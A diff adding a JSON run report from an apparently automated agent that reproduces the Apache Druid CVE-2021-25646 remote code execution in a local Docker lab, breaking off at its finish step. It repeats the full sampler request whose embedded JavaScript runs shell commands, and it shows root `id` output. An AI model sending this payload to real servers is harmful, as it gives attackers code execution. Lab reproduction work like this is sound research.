@@ -1,0 +1,437 @@
+{
+  "id": "CVE-2021-25646",
+  "project": "lab-druid-local-003",
+  "status": "success",
+  "cleanup": "completed",
+  "observations": [
+    {
+      "id": "action-1",
+      "action": "execute",
+      "status": "failed",
+      "phase": "health",
+      "error": "Remote end closed connection without response"
+    },
+    {
+      "id": "action-2",
+      "action": "logs",
+      "status": "completed",
+      "evidence": {
+        "argv": [
+          "docker",
+          "compose",
+          "--project-name",
+          "lab-druid-local-003",
+          "--file",
+          "F:\\codex-workspace\\VulnForge\\.labs\\lab-druid-local-003\\source\\docker-compose.yml",
+          "logs",
+          "--no-color",
+          "--tail",
+          "100"
+        ],
+        "exit_code": 0,
+        "stdout": "web-1  | [Thu Nov 19 18:58:47 2026] Running command[zk], logging to[/opt/druid/var/sv/zk.log]: bin/run-zk conf\nweb-1  | [Thu Nov 19 18:58:47 2026] Running command[coordinator-overlord], logging to[/opt/druid/var/sv/coordinator-overlord.log]: bin/run-druid coordinator-overlord conf/druid/single-server/nano-quickstart\nweb-1  | [Thu Nov 19 18:58:47 2026] Running command[broker], logging to[/opt/druid/var/sv/broker.log]: bin/run-druid broker conf/druid/single-server/nano-quickstart\nweb-1  | [Thu Nov 19 18:58:47 2026] Running command[router], logging to[/opt/druid/var/sv/router.log]: bin/run-druid router conf/druid/single-server/nano-quickstart\nweb-1  | [Thu Nov 19 18:58:47 2026] Running command[historical], logging to[/opt/druid/var/sv/historical.log]: bin/run-druid historical conf/druid/single-server/nano-quickstart\nweb-1  | [Thu Nov 19 18:58:47 2026] Running command[middleManager], logging to[/opt/druid/var/sv/middleManager.log]: bin/run-druid middleManager conf/druid/single-server/nano-quickstart\n",
+        "stderr": "",
+        "stdout_truncated": false,
+        "stderr_truncated": false
+      }
+    },
+    {
+      "id": "action-3",
+      "action": "execute",
+      "status": "completed",
+      "phase": "health",
+      "evidence": {
+        "status": 302,
+        "body": "",
+        "headers": [
+          [
+            "Connection",
+            "close"
+          ],
+          [
+            "Date",
+            "Thu, 19 Nov 2026 18:58:55 GMT"
+          ],
+          [
+            "Location",
+            "http://127.0.0.1:8888/unified-console.html"
+          ],
+          [
+            "Content-Length",
+            "0"
+          ]
+        ],
+        "truncated": false
+      }
+    },
+    {
+      "id": "action-4",
+      "action": "execute",
+      "status": "completed",
+      "phase": "reproduce",
+      "evidence": {
+        "status": 200,
+        "body": "{\"numRowsRead\":10,\"numRowsIndexed\":10,\"data\":[{\"input\":{\"timestamp\":123123,\"test\":\"uid=0(root) gid=0(root) groups=0(root)\\n\"},\"parsed\":{\"__time\":123123,\"test\":\"uid=0(root) gid=0(root) groups=0(root)\\n\"}}]}",
+        "headers": [
+          [
+            "Connection",
+            "close"
+          ],
+          [
+            "Date",
+            "Thu, 19 Nov 2026 18:58:57 GMT"
+          ],
+          [
+            "Date",
+            "Thu, 19 Nov 2026 18:58:57 GMT"
+          ],
+          [
+            "Content-Type",
+            "application/json"
+          ],
+          [
+            "Vary",
+            "Accept-Encoding, User-Agent"
+          ],
+          [
+            "Content-Length",
+            "205"
+          ]
+        ],
+        "truncated": false
+      }
+    }
+  ],
+  "workflow": "vulhub_sources",
+  "engine_type": "langgraph",
+  "trace": "F:\\codex-workspace\\VulnForge\\reports\\druid-local-003.trace.jsonl",
+  "research": {
+    "environment": "apache-druid/CVE-2021-25646",
+    "files": [
+      {
+        "source": "apache-druid/CVE-2021-25646/docker-compose.yml",
+        "text": "version: '2'\nservices:\n web:\n   image: vulhub/apache-druid:0.20.0\n   ports:\n    - \"8888:8888\"\n"
+      },
+      {
+        "source": "apache-druid/CVE-2021-25646/README.md",
+        "text": "# Apache Druid Embedded Javascript Remote Code Execution (CVE-2021-25646)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Druid is an open source, distributed data store that is designed for ingesting high volumes of data to provide instant data visibility, ad-hoc analytics and queries with low latency and high concurrency.\n\nApache Druid includes the ability to execute user-provided JavaScript code embedded in various types of requests. This functionality is intended for use in high-trust environments, and is disabled by default. However, in Druid 0.20.0 and earlier, it is possible for an authenticated user to send a specially-crafted request that forces Druid to run user-provided JavaScript code for that request, regardless of server configuration. This can be leveraged to execute code on the target machine with the privileges of the Druid server process.\n\nReferences:\n\n- <https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution>\n- <https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw>\n\n## Vulnerable Environment\n\nExecute following command to start an Apache Druid server 0.20.0:\n\n```\ndocker compose up -d\n```\n\nAfter server is started, you can see the home page of Apache Druid on `http://your-ip:8888`.\n\n## Exploit\n\nSend this request to the server:\n\n```\nPOST /druid/indexer/v1/sampler HTTP/1.1\nHost: your-ip:8888\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json\n\n{\n    \"type\":\"index\",\n    \"spec\":{\n        \"ioConfig\":{\n            \"type\":\"index\",\n            \"firehose\":{\n                \"type\":\"local\",\n                \"baseDir\":\"/etc\",\n                \"filter\":\"passwd\"\n            }\n        },\n        \"dataSchema\":{\n            \"dataSource\":\"test\",\n            \"parser\":{\n                \"parseSpec\":{\n                \"format\":\"javascript\",\n                \"timestampSpec\":{\n\n                },\n                \"dimensionsSpec\":{\n\n                },\n                \"function\":\"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\\"sh\\\",\\\"-c\\\",\\\"id\\\"]).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:123123,test: a}}\",\n                \"\":{\n                    \"enabled\":\"true\"\n                }\n                }\n            }\n        }\n    },\n    \"samplerConfig\":{\n        \"numRows\":10\n    }\n}\n```\n\nYou will see the output of the `id` command:\n\n![](1.png)\n"
+      },
+      {
+        "source": "apache-druid/CVE-2021-25646/README.zh-cn.md",
+        "text": "# Apache Druid 代码执行漏洞（CVE-2021-25646）\n\nApache Druid 是一个开源的分布式数据存储。\n\nApache Druid 包括执行嵌入在各种类型请求中的用户提供的 JavaScript 代码的能力。这个功能是为了在可信环境下使用，并且默认是禁用的。然而，在 Druid 0.20.0 及以前的版本中，攻击者可以通过发送一个恶意请求使 Druid 用内置引擎执行任意 JavaScript 代码，而不管服务器配置如何，这将导致代码和命令执行漏洞。\n\n参考链接：\n\n- <https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution>\n- <https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw>\n\n## 漏洞环境\n\n执行如下命令启动一个 Apache Druid 0.20.0 服务器：\n\n```\ndocker compose up -d\n```\n\n服务启动后，访问 `http://your-ip:8888` 即可查看到 Apache Druid 主页。\n\n## 漏洞复现\n\n直接发送如下请求即可执行其中的 JavaScript 代码：\n\n```\nPOST /druid/indexer/v1/sampler HTTP/1.1\nHost: your-ip:8888\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json\n\n{\n    \"type\":\"index\",\n    \"spec\":{\n        \"ioConfig\":{\n            \"type\":\"index\",\n            \"firehose\":{\n                \"type\":\"local\",\n                \"baseDir\":\"/etc\",\n                \"filter\":\"passwd\"\n            }\n        },\n        \"dataSchema\":{\n            \"dataSource\":\"test\",\n            \"parser\":{\n                \"parseSpec\":{\n                \"format\":\"javascript\",\n                \"timestampSpec\":{\n\n                },\n                \"dimensionsSpec\":{\n\n                },\n                \"function\":\"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\\"sh\\\",\\\"-c\\\",\\\"id\\\"]).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:123123,test: a}}\",\n                \"\":{\n                    \"enabled\":\"true\"\n                }\n                }\n            }\n        }\n    },\n    \"samplerConfig\":{\n        \"numRows\":10\n    }\n}\n```\n\n可见，`id` 命令已被成功执行：\n\n![](1.png)\n"
+      }
+    ],
+    "assets": [
+      "1.png",
+      "README.md",
+      "README.zh-cn.md",
+      "docker-compose.yml"
+    ],
+    "synthesis": {
+      "facts": [],
+      "missing_information": []
+    },
+    "generation": "source_documents"
+  },
+  "plan": {
+    "rationale": "The Compose file publishes service web on port 8888. The README documents the Druid homepage for readiness and one POST request for CVE-2021-25646. No initialization or container-exec commands are documented, so the plan contains only the readiness GET and the documented reproduction POST.",
+    "missing_information": [],
+    "operations": [
+      {
+        "id": "action-1",
+        "kind": "http",
+        "phase": "health",
+        "service": "web",
+        "container_port": 8888,
+        "method": "GET",
+        "path": "/",
+        "headers": {},
+        "body": null,
+        "argv": [],
+        "citation": "apache-druid/CVE-2021-25646/README.md",
+        "quote": "After server is started, you can see the home page of Apache Druid on `http://your-ip:8888`.",
+        "reason": "Use the documented homepage as the readiness HTTP check against the published container port 8888."
+      },
+      {
+        "id": "action-3",
+        "kind": "http",
+        "phase": "health",
+        "service": "web",
+        "container_port": 8888,
+        "method": "GET",
+        "path": "/",
+        "headers": {},
+        "body": null,
+        "argv": [],
+        "citation": "apache-druid/CVE-2021-25646/README.md",
+        "quote": "After server is started, you can see the home page of Apache Druid on `http://your-ip:8888`.",
+        "reason": "Retry the documented homepage readiness check now that Druid's processes have had time to boot; the earlier failure was 'Remote end closed connection without response' right after service startup."
+      },
+      {
+        "id": "action-4",
+        "kind": "http",
+        "phase": "reproduce",
+        "service": "web",
+        "container_port": 8888,
+        "method": "POST",
+        "path": "/druid/indexer/v1/sampler",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\n    \"type\":\"index\",\n    \"spec\":{\n        \"ioConfig\":{\n            \"type\":\"index\",\n            \"firehose\":{\n                \"type\":\"local\",\n                \"baseDir\":\"/etc\",\n                \"filter\":\"passwd\"\n            }\n        },\n        \"dataSchema\":{\n            \"dataSource\":\"test\",\n            \"parser\":{\n                \"parseSpec\":{\n                \"format\":\"javascript\",\n                \"timestampSpec\":{\n\n                },\n                \"dimensionsSpec\":{\n\n                },\n                \"function\":\"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\\"sh\\\",\\\"-c\\\",\\\"id\\\"]).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:123123,test: a}}\",\n                \"\":{\n                    \"enabled\":\"true\"\n                }\n                }\n            }\n        }\n    },\n    \"samplerConfig\":{\n        \"numRows\":10\n    }\n}",
+        "argv": [],
+        "citation": "apache-druid/CVE-2021-25646/README.md",
+        "quote": "POST /druid/indexer/v1/sampler HTTP/1.1\nHost: your-ip:8888\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json",
+        "reason": "Send the documented CVE-2021-25646 sampler payload with the preserved JSON body containing the embedded JavaScript `id` command to the Druid service on port 8888."
+      }
+    ]
+  },
+  "workspace": "F:\\codex-workspace\\VulnForge\\.labs\\lab-druid-local-003\\source",
+  "engine": {
+    "ready": true,
+    "start_attempted": false,
+    "status": "ready",
+    "server_version": "25.0.3"
+  },
+  "deployment": {
+    "argv": [
+      "docker",
+      "compose",
+      "--project-name",
+      "lab-druid-local-003",
+      "--file",
+      "F:\\codex-workspace\\VulnForge\\.labs\\lab-druid-local-003\\source\\docker-compose.yml",
+      "up",
+      "-d",
+      "--build",
+      "--wait",
+      "--wait-timeout",
+      "300"
+    ],
+    "exit_code": 0,
+    "stdout": "",
+    "stderr": "c7223c214c81 Downloading [===========================>                       ]    175MB/322.2MB\n c7223c214c81 Downloading [===========================>                       ]  176.1MB/322.2MB\n c7223c214c81 Downloading [===========================>                       ]  177.7MB/322.2MB\n c7223c214c81 Downloading [===========================>                       ]  178.8MB/322.2MB\n c7223c214c81 Downloading [===========================>                       ]  179.8MB/322.2MB\n c7223c214c81 Downloading [============================>                      ]  180.9MB/322.2MB\n c7223c214c81 Downloading [============================>                      ]    182MB/322.2MB\n c7223c214c81 Downloading [============================>                      ]  183.1MB/322.2MB\n c7223c214c81 Downloading [============================>                      ]  184.1MB/322.2MB\n c7223c214c81 Downloading [============================>                      ]  185.2MB/322.2MB\n c7223c214c81 Downloading [============================>                      ]  186.8MB/322.2MB\n c7223c214c81 Downloading [=============================>                     ]  187.9MB/322.2MB\n c7223c214c81 Downloading [=============================>                     ]  188.9MB/322.2MB\n c7223c214c81 Downloading [=============================>                     ]  189.4MB/322.2MB\n c7223c214c81 Downloading [=============================>                     ]  190.5MB/322.2MB\n c7223c214c81 Downloading [=============================>                     ]  191.6MB/322.2MB\n c7223c214c81 Downloading [=============================>                     ]  192.6MB/322.2MB\n c7223c214c81 Downloading [==============================>                    ]  193.7MB/322.2MB\n c7223c214c81 Downloading [==============================>                    ]  194.2MB/322.2MB\n c7223c214c81 Downloading [==============================>                    ]  194.8MB/322.2MB\n c7223c214c81 Downloading [==============================>                    ]  195.3MB/322.2MB\n c7223c214c81 Downloading [==============================>                    ]  195.8MB/322.2MB\n c7223c214c81 Downloading [==============================>                    ]    198MB/322.2MB\n c7223c214c81 Downloading [==============================>                    ]  199.1MB/322.2MB\n c7223c214c81 Downloading [===============================>                   ]  200.1MB/322.2MB\n c7223c214c81 Downloading [===============================>                   ]  201.2MB/322.2MB\n c7223c214c81 Downloading [===============================>                   ]  202.2MB/322.2MB\n c7223c214c81 Downloading [===============================>                   ]  203.3MB/322.2MB\n c7223c214c81 Downloading [===============================>                   ]  203.8MB/322.2MB\n c7223c214c81 Downloading [===============================>                   ]  204.9MB/322.2MB\n c7223c214c81 Downloading [===============================>                   ]    206MB/322.2MB\n c7223c214c81 Downloading [================================>                  ]  207.1MB/322.2MB\n c7223c214c81 Downloading [================================>                  ]  208.1MB/322.2MB\n c7223c214c81 Downloading [================================>                  ]  209.2MB/322.2MB\n c7223c214c81 Downloading [================================>                  ]  210.3MB/322.2MB\n c7223c214c81 Downloading [================================>                  ]  211.3MB/322.2MB\n c7223c214c81 Downloading [================================>                  ]  212.4MB/322.2MB\n c7223c214c81 Downloading [=================================>                 ]  213.5MB/322.2MB\n c7223c214c81 Downloading [=================================>                 ]  214.5MB/322.2MB\n c7223c214c81 Downloading [=================================>                 ]  215.6MB/322.2MB\n c7223c214c81 Downloading [=================================>                 ]  217.2MB/322.2MB\n c7223c214c81 Downloading [=================================>                 ]  218.3MB/322.2MB\n c7223c214c81 Downloading [==================================>                ]  219.4MB/322.2MB\n c7223c214c81 Downloading [==================================>                ]  220.4MB/322.2MB\n c7223c214c81 Downloading [==================================>                ]  221.5MB/322.2MB\n c7223c214c81 Downloading [==================================>                ]  222.6MB/322.2MB\n c7223c214c81 Downloading [==================================>                ]  223.6MB/322.2MB\n c7223c214c81 Downloading [==================================>                ]  224.2MB/322.2MB\n c7223c214c81 Downloading [==================================>                ]  225.3MB/322.2MB\n c7223c214c81 Downloading [===================================>               ]  226.3MB/322.2MB\n c7223c214c81 Downloading [===================================>               ]  226.9MB/322.2MB\n c7223c214c81 Downloading [===================================>               ]  227.9MB/322.2MB\n c7223c214c81 Downloading [===================================>               ]  228.5MB/322.2MB\n c7223c214c81 Downloading [===================================>               ]  230.1MB/322.2MB\n c7223c214c81 Downloading [===================================>               ]  231.1MB/322.2MB\n c7223c214c81 Downloading [====================================>              ]  232.2MB/322.2MB\n c7223c214c81 Downloading [====================================>              ]  233.2MB/322.2MB\n c7223c214c81 Downloading [====================================>              ]  234.3MB/322.2MB\n c7223c214c81 Downloading [====================================>              ]  236.4MB/322.2MB\n c7223c214c81 Downloading [====================================>              ]  237.5MB/322.2MB\n c7223c214c81 Downloading [=====================================>             ]  238.5MB/322.2MB\n c7223c214c81 Downloading [=====================================>             ]  239.1MB/322.2MB\n c7223c214c81 Downloading [=====================================>             ]  240.1MB/322.2MB\n c7223c214c81 Downloading [=====================================>             ]  241.2MB/322.2MB\n c7223c214c81 Downloading [=====================================>             ]  242.3MB/322.2MB\n c7223c214c81 Downloading [=====================================>             ]  242.8MB/322.2MB\n c7223c214c81 Downloading [=====================================>             ]  243.3MB/322.2MB\n c7223c214c81 Downloading [=====================================>             ]  244.4MB/322.2MB\n c7223c214c81 Downloading [======================================>            ]    245MB/322.2MB\n c7223c214c81 Downloading [======================================>            ]    246MB/322.2MB\n c7223c214c81 Downloading [======================================>            ]  246.5MB/322.2MB\n c7223c214c81 Downloading [======================================>            ]  247.6MB/322.2MB\n c7223c214c81 Downloading [======================================>            ]  248.1MB/322.2MB\n c7223c214c81 Downloading [======================================>            ]  249.2MB/322.2MB\n c7223c214c81 Downloading [======================================>            ]  249.8MB/322.2MB\n c7223c214c81 Downloading [======================================>            ]  250.8MB/322.2MB\n c7223c214c81 Downloading [=======================================>           ]  251.9MB/322.2MB\n c7223c214c81 Downloading [=======================================>           ]    253MB/322.2MB\n c7223c214c81 Downloading [=======================================>           ]    254MB/322.2MB\n c7223c214c81 Downloading [=======================================>           ]  254.5MB/322.2MB\n c7223c214c81 Downloading [=======================================>           ]  255.1MB/322.2MB\n c7223c214c81 Downloading [=======================================>           ]  256.2MB/322.2MB\n c7223c214c81 Downloading [========================================>          ]  257.8MB/322.2MB\n c7223c214c81 Downloading [========================================>          ]  258.3MB/322.2MB\n c7223c214c81 Downloading [========================================>          ]  259.4MB/322.2MB\n c7223c214c81 Downloading [========================================>          ]    261MB/322.2MB\n c7223c214c81 Downloading [========================================>          ]  262.1MB/322.2MB\n c7223c214c81 Downloading [========================================>          ]  263.1MB/322.2MB\n c7223c214c81 Downloading [=========================================>         ]  264.2MB/322.2MB\n c7223c214c81 Downloading [=========================================>         ]  265.3MB/322.2MB\n c7223c214c81 Downloading [=========================================>         ]  265.8MB/322.2MB\n c7223c214c81 Downloading [=========================================>         ]  266.9MB/322.2MB\n c7223c214c81 Downloading [=========================================>         ]  267.9MB/322.2MB\n c7223c214c81 Downloading [=========================================>         ]    269MB/322.2MB\n c7223c214c81 Downloading [=========================================>         ]  270.1MB/322.2MB\n c7223c214c81 Downloading [==========================================>        ]  271.1MB/322.2MB\n c7223c214c81 Downloading [==========================================>        ]  272.2MB/322.2MB\n c7223c214c81 Downloading [==========================================>        ]  273.3MB/322.2MB\n c7223c214c81 Downloading [==========================================>        ]  274.3MB/322.2MB\n c7223c214c81 Downloading [==========================================>        ]  274.8MB/322.2MB\n c7223c214c81 Downloading [==========================================>        ]  275.9MB/322.2MB\n c7223c214c81 Downloading [===========================================>       ]  277.5MB/322.2MB\n c7223c214c81 Downloading [===========================================>       ]  278.6MB/322.2MB\n c7223c214c81 Downloading [===========================================>       ]  279.7MB/322.2MB\n c7223c214c81 Downloading [===========================================>       ]  280.7MB/322.2MB\n c7223c214c81 Downloading [===========================================>       ]  281.8MB/322.2MB\n c7223c214c81 Downloading [===========================================>       ]  282.8MB/322.2MB\n c7223c214c81 Downloading [============================================>      ]  283.9MB/322.2MB\n c7223c214c81 Downloading [============================================>      ]    285MB/322.2MB\n c7223c214c81 Downloading [============================================>      ]  286.1MB/322.2MB\n c7223c214c81 Downloading [============================================>      ]  287.1MB/322.2MB\n c7223c214c81 Downloading [============================================>      ]  288.2MB/322.2MB\n c7223c214c81 Downloading [============================================>      ]  289.3MB/322.2MB\n c7223c214c81 Downloading [=============================================>     ]  290.3MB/322.2MB\n c7223c214c81 Downloading [=============================================>     ]  291.4MB/322.2MB\n c7223c214c81 Downloading [=============================================>     ]  292.5MB/322.2MB\n c7223c214c81 Downloading [=============================================>     ]  293.5MB/322.2MB\n c7223c214c81 Downloading [=============================================>     ]  294.6MB/322.2MB\n c7223c214c81 Downloading [=============================================>     ]  296.2MB/322.2MB\n c7223c214c81 Downloading [==============================================>    ]  297.3MB/322.2MB\n c7223c214c81 Downloading [==============================================>    ]  298.4MB/322.2MB\n c7223c214c81 Downloading [==============================================>    ]  299.4MB/322.2MB\n c7223c214c81 Downloading [==============================================>    ]  300.5MB/322.2MB\n c7223c214c81 Downloading [==============================================>    ]  301.5MB/322.2MB\n c7223c214c81 Downloading [==============================================>    ]  302.6MB/322.2MB\n c7223c214c81 Downloading [===============================================>   ]  303.6MB/322.2MB\n c7223c214c81 Downloading [===============================================>   ]  304.7MB/322.2MB\n c7223c214c81 Downloading [===============================================>   ]  305.7MB/322.2MB\n c7223c214c81 Downloading [===============================================>   ]  308.4MB/322.2MB\n c7223c214c81 Downloading [================================================>  ]  309.5MB/322.2MB\n c7223c214c81 Downloading [================================================>  ]  311.1MB/322.2MB\n c7223c214c81 Downloading [================================================>  ]  312.7MB/322.2MB\n c7223c214c81 Downloading [================================================>  ]  313.8MB/322.2MB\n c7223c214c81 Downloading [================================================>  ]  314.8MB/322.2MB\n c7223c214c81 Downloading [=================================================> ]  315.9MB/322.2MB\n c7223c214c81 Downloading [=================================================> ]    317MB/322.2MB\n c7223c214c81 Downloading [=================================================> ]    318MB/322.2MB\n c7223c214c81 Downloading [=================================================> ]  319.1MB/322.2MB\n c7223c214c81 Downloading [=================================================> ]  319.6MB/322.2MB\n c7223c214c81 Downloading [=================================================> ]  320.7MB/322.2MB\n c7223c214c81 Verifying Checksum \n c7223c214c81 Download complete \n c7223c214c81 Extracting [>                                                  ]  557.1kB/322.2MB\n c7223c214c81 Extracting [===>                                               ]  20.61MB/322.2MB\n c7223c214c81 Extracting [======>                                            ]  40.11MB/322.2MB\n c7223c214c81 Extracting [=========>                                         ]  61.83MB/322.2MB\n c7223c214c81 Extracting [============>                                      ]  82.44MB/322.2MB\n c7223c214c81 Extracting [===============>                                   ]  102.5MB/322.2MB\n c7223c214c81 Extracting [===================>                               ]  122.6MB/322.2MB\n c7223c214c81 Extracting [======================>                            ]  143.2MB/322.2MB\n c7223c214c81 Extracting [=========================>                         ]  161.5MB/322.2MB\n c7223c214c81 Extracting [============================>                      ]  182.7MB/322.2MB\n c7223c214c81 Extracting [===============================>                   ]  200.5MB/322.2MB\n c7223c214c81 Extracting [==================================>                ]  219.5MB/322.2MB\n c7223c214c81 Extracting [=====================================>             ]  239.5MB/322.2MB\n c7223c214c81 Extracting [========================================>          ]  259.6MB/322.2MB\n c7223c214c81 Extracting [===========================================>       ]  278.5MB/322.2MB\n c7223c214c81 Extracting [==============================================>    ]  298.6MB/322.2MB\n c7223c214c81 Extracting [=================================================> ]  316.4MB/322.2MB\n c7223c214c81 Extracting [==================================================>]  322.2MB/322.2MB\n c7223c214c81 Pull complete \n 4f4fb700ef54 Extracting [==================================================>]      32B/32B\n 4f4fb700ef54 Extracting [==================================================>]      32B/32B\n 4f4fb700ef54 Pull complete \n web Pulled \n Network lab-druid-local-003_default  Creating\n Network lab-druid-local-003_default  Created\n Container lab-druid-local-003-web-1  Creating\n Container lab-druid-local-003-web-1  Created\n Container lab-druid-local-003-web-1  Starting\n Container lab-druid-local-003-web-1  Started\n Container lab-druid-local-003-web-1  Waiting\n Container lab-druid-local-003-web-1  Healthy\n",
+    "stdout_truncated": false,
+    "stderr_truncated": true
+  },
+  "initial_plan": {
+    "rationale": "The Compose file publishes service web on port 8888. The README documents the Druid homepage for readiness and one POST request for CVE-2021-25646. No initialization or container-exec commands are documented, so the plan contains only the readiness GET and the documented reproduction POST.",
+    "missing_information": [],
+    "operations": [
+      {
+        "id": "health-home",
+        "kind": "http",
+        "phase": "health",
+        "service": "web",
+        "container_port": 8888,
+        "method": "GET",
+        "path": "/",
+        "headers": {},
+        "body": null,
+        "argv": [],
+        "citation": "apache-druid/CVE-2021-25646/README.md",
+        "quote": "After server is started, you can see the home page of Apache Druid on `http://your-ip:8888`.",
+        "reason": "Use the documented homepage as the readiness HTTP check against the published container port 8888."
+      },
+      {
+        "id": "reproduce-cve-2021-25646",
+        "kind": "http",
+        "phase": "reproduce",
+        "service": "web",
+        "container_port": 8888,
+        "method": "POST",
+        "path": "/druid/indexer/v1/sampler",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\n    \"type\":\"index\",\n    \"spec\":{\n        \"ioConfig\":{\n            \"type\":\"index\",\n            \"firehose\":{\n                \"type\":\"local\",\n                \"baseDir\":\"/etc\",\n                \"filter\":\"passwd\"\n            }\n        },\n        \"dataSchema\":{\n            \"dataSource\":\"test\",\n            \"parser\":{\n                \"parseSpec\":{\n                \"format\":\"javascript\",\n                \"timestampSpec\":{\n\n                },\n                \"dimensionsSpec\":{\n\n                },\n                \"function\":\"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\\"sh\\\",\\\"-c\\\",\\\"id\\\"]).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:123123,test: a}}\",\n                \"\":{\n                    \"enabled\":\"true\"\n                }\n                }\n            }\n        }\n    },\n    \"samplerConfig\":{\n        \"numRows\":10\n    }\n}",
+        "argv": [],
+        "citation": "apache-druid/CVE-2021-25646/README.md",
+        "quote": "POST /druid/indexer/v1/sampler HTTP/1.1\nHost: your-ip:8888\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json",
+        "reason": "Send the documented CVE-2021-25646 sampler request with the preserved JSON body to the Druid service. No exec commands are documented for this environment."
+      }
+    ]
+  },
+  "decisions": [
+    {
+      "turn": 1,
+      "action": "execute",
+      "reason": "No prior observations exist. First verify the Druid service is reachable on the published port 8888 using the documented homepage before sending the exploit request.",
+      "operation": {
+        "id": "health-home",
+        "kind": "http",
+        "phase": "health",
+        "service": "web",
+        "container_port": 8888,
+        "method": "GET",
+        "path": "/",
+        "headers": {},
+        "body": null,
+        "argv": [],
+        "citation": "apache-druid/CVE-2021-25646/README.md",
+        "quote": "After server is started, you can see the home page of Apache Druid on `http://your-ip:8888`.",
+        "reason": "Use the documented homepage as the readiness HTTP check against the published container port 8888."
+      },
+      "source_path": null
+    },
+    {
+      "turn": 2,
+      "action": "logs",
+      "reason": "The readiness GET / on port 8888 failed with 'Remote end closed connection without response', which suggests the Druid service is still starting or crashed. Inspect the container logs to diagnose before retrying.",
+      "operation": null,
+      "source_path": null
+    },
+    {
+      "turn": 3,
+      "action": "execute",
+      "reason": "The readiness GET failed because Druid had just launched all services (zk, coordinator-overlord, broker, router, historical, middleManager) at 18:58:47 and was not yet accepting requests. This is a startup race, not a wrong port/path. A read-only GET '/' retry is safe and matches the documented homepage check.",
+      "operation": {
+        "id": "health-home-retry",
+        "kind": "http",
+        "phase": "health",
+        "service": "web",
+        "container_port": 8888,
+        "method": "GET",
+        "path": "/",
+        "headers": {},
+        "body": null,
+        "argv": [],
+        "citation": "apache-druid/CVE-2021-25646/README.md",
+        "quote": "After server is started, you can see the home page of Apache Druid on `http://your-ip:8888`.",
+        "reason": "Retry the documented homepage readiness check now that Druid's processes have had time to boot; the earlier failure was 'Remote end closed connection without response' right after service startup."
+      },
+      "source_path": null
+    },
+    {
+      "turn": 4,
+      "action": "execute",
+      "reason": "The health check now succeeds (302 to /unified-console.html), confirming Druid is up. Send the documented CVE-2021-25646 sampler request to execute `id` via the embedded JavaScript parser.",
+      "operation": {
+        "id": "reproduce-cve-2021-25646",
+        "kind": "http",
+        "phase": "reproduce",
+        "service": "web",
+        "container_port": 8888,
+        "method": "POST",
+        "path": "/druid/indexer/v1/sampler",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\n    \"type\":\"index\",\n    \"spec\":{\n        \"ioConfig\":{\n            \"type\":\"index\",\n            \"firehose\":{\n                \"type\":\"local\",\n                \"baseDir\":\"/etc\",\n                \"filter\":\"passwd\"\n            }\n        },\n        \"dataSchema\":{\n            \"dataSource\":\"test\",\n            \"parser\":{\n                \"parseSpec\":{\n                \"format\":\"javascript\",\n                \"timestampSpec\":{\n\n                },\n                \"dimensionsSpec\":{\n\n                },\n                \"function\":\"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\\"sh\\\",\\\"-c\\\",\\\"id\\\"]).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:123123,test: a}}\",\n                \"\":{\n                    \"enabled\":\"true\"\n                }\n                }\n            }\n        }\n    },\n    \"samplerConfig\":{\n        \"numRows\":10\n    }\n}",
+        "argv": [],
+        "citation": "apache-druid/CVE-2021-25646/README.md",
+        "quote": "POST /druid/indexer/v1/sampler HTTP/1.1\nHost: your-ip:8888\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json",
+        "reason": "Send the documented CVE-2021-25646 sampler payload with the preserved JSON body containing the embedded JavaScript `id` command to the Druid service on port 8888."
+      },
+      "source_path": null
+    },
+    {
+      "turn": 5,
+      "action": "finish",
+      "reason": "The documented reproduction request returned HTTP 200 and the sampler response embeds the output of the injected `id` command (`uid=0(root) gid=0(root) groups=0(root)`), confirming remote command execution via CVE-2021-25646 in the Druid 0.20.0 container. No further steps are needed, so the attempt is submitted to the evaluator.",
+      "operation": null,
